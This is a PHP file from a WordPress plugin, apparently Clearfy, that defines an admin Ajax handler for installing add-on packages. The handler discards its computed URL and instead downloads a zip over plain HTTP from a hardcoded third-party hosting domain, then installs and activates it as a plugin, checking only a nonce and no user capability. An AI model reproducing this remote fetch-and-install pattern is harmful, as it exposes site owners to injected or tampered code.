<?php
	/**
	 * Ajax plugin configuration
	 * @author Webcraftic <wordpress.webraftic@gmail.com>
	 * @copyright (c) 2017 Webraftic Ltd
	 * @version 1.0
	 */

	// Exit if accessed directly
	if( !defined('ABSPATH') ) {
		exit;
	}

	/**
	 * This action allows you to process Ajax requests to activate external components Clearfy
	 */
	function wbcr_clearfy_update_package() {
		check_ajax_referer( 'package' );
		
		$freemius_activated_addons = WCL_Plugin::app()->getOption( 'freemius_activated_addons', array() );
		$package_slugs = array();
		if( is_plugin_active( 'clearfy-package/clearfy-package.php' ) ) {
			$package_plugin = WCL_Package_Plugin::instance();
			$package_slugs = $package_plugin->getSlugs();
			foreach ( $freemius_activated_addons as $freemius_addon ) {
				if ( ! in_array( $freemius_addon, $package_slugs ) ) {
					$package_slugs[] = $freemius_addon;
				}
			}
		}
		if ( ! $package_slugs ) {
			$package_slugs = $freemius_activated_addons;
		}
		
		$url = '/package/assembly-package.php?addons=' . join( ',', $package_slugs );
		if ( count( $package_slugs) > 1 ) {
			$url = 'http://u16313p6h.ha002.t.justns.ru/clearfy-package2.zip';
		} else {
			$url = 'http://u16313p6h.ha002.t.justns.ru/clearfy-package1.zip';
		}
		
		global $wp_filesystem;
		if( !$wp_filesystem ) {
			if( !function_exists('WP_Filesystem') ) {
				require_once(ABSPATH . 'wp-admin/includes/file.php');
			}
			WP_Filesystem();
		}

		if( !WP_Filesystem(false, WP_PLUGIN_DIR) || 'direct' !== $wp_filesystem->method ) {
			throw new Exception('You are not allowed to edt folders/files on this site');
		} else {
			ob_start();

			require_once(ABSPATH . 'wp-admin/includes/file.php');
			require_once(ABSPATH . 'wp-admin/includes/misc.php');
			require_once(ABSPATH . 'wp-admin/includes/class-wp-upgrader.php');
			require_once(WCL_PLUGIN_DIR . '/admin/includes/classes/class.upgrader-skin.php');
			add_filter('async_update_translation', '__return_false', 1);

			$upgrader = new Plugin_Upgrader(new WCL_Upgrader_Skin);
			if( is_plugin_active( 'clearfy-package/clearfy-package.php' ) ) {
				$result = $upgrader->run( array(
					'package' => $url,
					'destination' => WP_PLUGIN_DIR,
					'clear_destination' => true,
					'clear_working' => true,
					'hook_extra' => array(
						'plugin' => 'clearfy-package/clearfy-package.php',
						'type' => 'plugin',
						'action' => 'update',
					),
				) );
			} else {
				$result = $upgrader->install( $url );
				activate_plugin( 'clearfy-package/clearfy-package.php' );
			}
			
			ob_end_clean();

			if( null === $result ) {
				throw new Exception('Could not complete add-on installation');
			}
		}
		
		$success = true;
		$data = array();
		$data['msg'] = __( 'Конфигурация обновлена', 'clearfy' );
		$data['url'] = $result;
		if($success) {
			wp_send_json_success( $data );
		}

		wp_send_json_error(array('errorMessage' => __('An unknown error occurred during the activation of the component.', 'clearfy')));
	}

	add_action('wp_ajax_wbcr-clearfy-update-package', 'wbcr_clearfy_update_package');
